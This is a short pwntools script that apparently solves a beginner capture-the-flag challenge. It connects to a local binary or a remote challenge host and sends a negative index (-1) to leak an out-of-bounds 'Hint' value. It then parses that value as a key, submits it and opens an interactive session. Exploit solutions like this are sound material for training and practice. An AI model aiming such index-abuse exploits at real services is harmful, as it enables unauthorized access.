#!/usr/bin/python3

from pwn import *

if args.REMOTE:
    conn = remote("challs.beginner.havce.it", 1346)
else:
    conn = process(["./chall"])
conn.sendafter("plank\n", b'1\n')
conn.sendafter("hear\n", b'-1\n')
hint = conn.recvuntil("plank\n").decode("utf-8")
key = int(hint.split("Hint[-1] = ")[1].split("\n")[0], 16)
print("The key is:", key)
conn.sendline(b'2')
conn.sendafter("chest: ", str(key) + '\n')
conn.interactive()
